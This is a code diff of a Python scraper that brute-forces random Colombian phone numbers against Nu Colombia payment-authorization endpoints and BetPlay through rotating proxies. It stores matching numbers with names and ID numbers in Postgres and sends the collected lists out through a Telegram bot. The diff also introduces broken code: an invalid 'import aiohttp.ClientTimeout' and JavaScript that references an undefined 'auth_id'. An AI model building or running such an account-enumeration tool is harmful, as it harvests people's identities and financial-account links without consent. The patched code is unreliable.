@@ -11,12 +11,12 @@ from collections import deque
 from typing import Dict, Tuple, Optional
 
 import aiohttp
+import aiohttp.ClientTimeout
 from playwright.async_api import async_playwright
 
-# --- DB CHANGE: Imports para SQLAlchemy ---
+# --- DB CHANGE: Imports para SQLAlchemy 2.0 ---
 from sqlalchemy import create_engine, Column, Integer, String, DateTime
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker
+from sqlalchemy.orm import declarative_base, sessionmaker
 from datetime import datetime
 
 logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -74,10 +74,9 @@ PROXIES = [
 # ======================================================================
 #  DATABASE SETUP (SQLAlchemy)
 # ======================================================================
-# Railway inyecta automáticamente DATABASE_URL si conectas el servicio de Postgres
 DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@127.0.0.1:5432/checker")
 
-engine = create_engine(DATABASE_URL, pool_size=5, max_overflow=10)
+engine = create_engine(DATABASE_URL, pool_size=5, max_overflow=10, pool_pre_ping=True)
 SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
 Base = declarative_base()
 
@@ -144,7 +143,6 @@ def avanzar_correo() -> str:
     global _indice_correo
     _indice_correo += 1
     nuevo = correo_actual()
-    # no borramos el archivo, pero ya no nos importa
     print(f"[i] Correo cambiado -> {nuevo}")
     return nuevo
 
@@ -239,22 +237,22 @@ class BetplayChecker:
 # ======================================================================
 class MemoriaDB:
     def __init__(self):
-        pass # No necesitamos cargar de archivo, ya se crearon las tablas
+        pass 
 
     async def registrar(self, celular, exito):
         db = SessionLocal()
         try:
-            # Actualizar Stats
             stats = db.query(Stats).first()
             if not stats:
                 stats = Stats(intentos=0, aciertos=0)
                 db.add(stats)
-            
             stats.intentos += 1
             if exito:
                 stats.aciertos += 1
-            
             db.commit()
+        except Exception as e:
+            print(f"[!] Error DB registrar: {e}")
+            db.rollback()
         finally:
             db.close()
 
@@ -274,7 +272,6 @@ class MemoriaDB:
             stats = db.query(Stats).first()
             intentos = stats.intentos if stats else 0
             aciertos = stats.aciertos if stats else 0
-            
             lineas = ["📈 <b>Estadísticas</b>",
                       f"Intentos: {intentos}",
                       f"Aciertos: {aciertos}",
@@ -288,7 +285,6 @@ mem = MemoriaDB()
 # ======================================================================
 #  TELEGRAM
 # ======================================================================
-# DB CHANGE: Contar desde DB
 def contar_existentes() -> int:
     db = SessionLocal()
     try:
@@ -311,14 +307,14 @@ class Telegram:
     async def start(self):
         if not self.activo:
             return
-        self.session = aiohttp.ClientSession()
+        self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))
         try:
-            async with self.session.get(self.url("getUpdates"), params={"timeout": 0}) as r:
+            async with self.session.get(self.url("getUpdates"), params={"timeout": 0}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                 data = await r.json()
             for upd in data.get("result", []):
                 self.offset = upd["update_id"] + 1
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[!] Error inicializando Telegram: {e}")
 
     async def cerrar(self):
         if self.session and not self.session.closed:
@@ -328,16 +324,17 @@ class Telegram:
         if not self.activo or not self.session:
             return None
         try:
+            timeout = aiohttp.ClientTimeout(total=30)
             if files:
                 data = aiohttp.FormData()
                 for k, v in (params or {}).items():
                     data.add_field(k, str(v))
                 for k, (nombre, contenido) in files.items():
                     data.add_field(k, contenido, filename=nombre)
-                async with self.session.post(self.url(method), data=data) as r:
+                async with self.session.post(self.url(method), data=data, timeout=timeout) as r:
                     return await r.json()
             else:
-                async with self.session.post(self.url(method), json=params or {}) as r:
+                async with self.session.post(self.url(method), json=params or {}, timeout=timeout) as r:
                     return await r.json()
         except Exception as e:
             logger.error(f"telegram {method}: {type(e).__name__}: {e}")
@@ -363,9 +360,10 @@ class Telegram:
         if not cid:
             return
         try:
+            timeout = aiohttp.ClientTimeout(total=60)
             async with self.session.post(self.url("sendDocument"), 
                                          json={"chat_id": cid, "caption": caption, "parse_mode": "HTML"},
-                                         data={"document": contenido}) as r:
+                                         data={"document": contenido}, timeout=timeout) as r:
                 return await r.json()
         except Exception as e:
             logger.error(f"Send document error: {e}")
@@ -379,7 +377,10 @@ class Telegram:
         if self.contador_msg_id:
             await self.editar(self.contador_msg_id, texto)
         else:
-            self.contador_msg_id = await self.enviar(texto)
+            try:
+                self.contador_msg_id = await self.enviar(texto)
+            except Exception as e:
+                print(f"[!] Error enviando contador inicial: {e}")
 
     async def notificar_guardado(self, celular, referencia, nombre=""):
         extra = f"\n👤 {nombre}" if nombre else ""
@@ -392,22 +393,19 @@ class Telegram:
         texto = (msg.get("text") or "").strip()
         chat_id = str((msg.get("chat") or {}).get("id", ""))
         
-        # --- AGREGAR ESTO ---
         print(f"[DEBUG TELEGRAM] Recibido: '{texto}' de ChatID: {chat_id}")
-        # --------------------
-
+        
         if not texto or not chat_id:
             return
         
+        # ACTUALIZAR CHAT_ID INMEDIATAMENTE
         if not self.chat_id:
             self.chat_id = chat_id
             print(f"[DEBUG TELEGRAM] ChatID guardado: {self.chat_id}")
 
         cmd = texto.split()[0].split("@")[0].lower()
 
-        # --- AGREGAR ESTO ---
         print(f"[DEBUG TELEGRAM] Comando detectado: {cmd}")
-        # --------------------
 
         if cmd in ("/start", "/ayuda", "/help"):
             await self.enviar(
@@ -430,6 +428,9 @@ class Telegram:
                     await self.enviar_documento(contenido.encode('utf-8'), caption=f"existentes.txt ({len(registros)} registros)", chat_id=chat_id)
                 else:
                     await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
+            except Exception as e:
+                print(f"[!] Error descargando DB: {e}")
+                await self.enviar("Error al generar archivo", chat_id=chat_id)
             finally:
                 db.close()
         elif cmd == "/numeros":
@@ -447,6 +448,9 @@ class Telegram:
                     await self.enviar_documento(contenido.encode('utf-8'), caption=f"{len(nums)} números en formato 57", chat_id=chat_id)
                 else:
                     await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
+            except Exception as e:
+                print(f"[!] Error descargando números: {e}")
+                await self.enviar("Error al generar archivo", chat_id=chat_id)
             finally:
                 db.close()
         elif cmd == "/stats":
@@ -454,13 +458,14 @@ class Telegram:
         elif cmd == "/reset_stats":
             db = SessionLocal()
             try:
-                # Solo resetear stats, no borrar datos
                 stats = db.query(Stats).first()
                 if stats:
                     stats.intentos = 0
                     stats.aciertos = 0
                     db.commit()
                 await self.enviar("♻️ Estadísticas reseteadas", chat_id=chat_id)
+            except Exception as e:
+                print(f"[!] Error reset stats: {e}")
             finally:
                 db.close()
         else:
@@ -471,14 +476,16 @@ class Telegram:
             return
         while True:
             try:
+                timeout = aiohttp.ClientTimeout(total=40)
                 async with self.session.get(self.url("getUpdates"),
                                             params={"timeout": 30, "offset": self.offset},
-                                            timeout=aiohttp.ClientTimeout(total=40)) as r:
+                                            timeout=timeout) as r:
                     data = await r.json()
                 for upd in data.get("result", []):
                     self.offset = upd["update_id"] + 1
                     await self.procesar_update(upd)
-            except Exception:
+            except Exception as e:
+                logger.error(f"Error en polling: {e}")
                 await asyncio.sleep(2)
 
 tg = Telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
@@ -528,7 +535,6 @@ def _usados():
     global _usados_cache
     if _usados_cache is None:
         _usados_cache = set()
-        # DB CHANGE: Leer de DB
         db = SessionLocal()
         try:
             usados_db = db.query(FoundNumber.celular).all()
@@ -539,13 +545,12 @@ def _usados():
 
 def _marcar_usado(n):
     _usados().add(n)
-    # No guardamos en archivo, la DB se actualiza al guardar
 
 def _valido(s):
     return s[:3] in PREFIJOS_SET and s not in _usados()
 
 def _prefijo_aprendido():
-    return None # Simplificado para esta versión DB
+    return None 
 
 def generar_aleatorio():
     pref = random.choices(list(PREFIJOS_PESO), weights=list(PREFIJOS_PESO.values()))[0]
@@ -718,7 +723,7 @@ async (authId) => {
     const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/authorization/details-web', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({id: authId})
+        body: JSON.stringify({id: auth_id})
     });
     return await r.json();
 }
@@ -729,7 +734,7 @@ async (authId) => {
     const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/cancel-payment-web', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({'authorization-id': authId})
+        body: JSON.stringify({'authorization-id': auth_id})
     });
     return await r.json();
 }
@@ -807,7 +812,6 @@ def telefono_coincide(celular: str, tel_betplay: str) -> bool:
         return False
     return tel_digits[:3] == celular[:3] and tel_digits[-3:] == celular[-3:]
 
-# DB CHANGE: Función de guardado en DB
 async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
     print(f"[?] Probando referencia {referencia} en BetPlay...")
     checker = BetplayChecker()
@@ -829,7 +833,6 @@ async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
             return False
             
         if telefono_coincide(celular, tel):
-            # Verificar si ya existe en DB para evitar duplicados
             existente = db.query(FoundNumber).filter(FoundNumber.celular == celular).first()
             if not existente:
                 nuevo_registro = FoundNumber(
@@ -1091,10 +1094,18 @@ async def main():
         _marcar_usado(arg)
         _pila_vecinos.appendleft(arg)
 
-    await tg.start()
+    # INICIALIZACIÓN SEGURA DE TELEGRAM
+    try:
+        await tg.start()
+    except Exception as e:
+        print(f"[!] Error iniciando Telegram: {e}")
+
     if tg.activo:
         asyncio.create_task(tg.poll())
-        await tg.actualizar_contador()
+        try:
+            await tg.actualizar_contador()
+        except Exception as e:
+            print(f"[!] Error enviando mensaje inicial: {e}")
         print("[i] Telegram activo")
     else:
         print("[i] Telegram desactivado (falta token)")
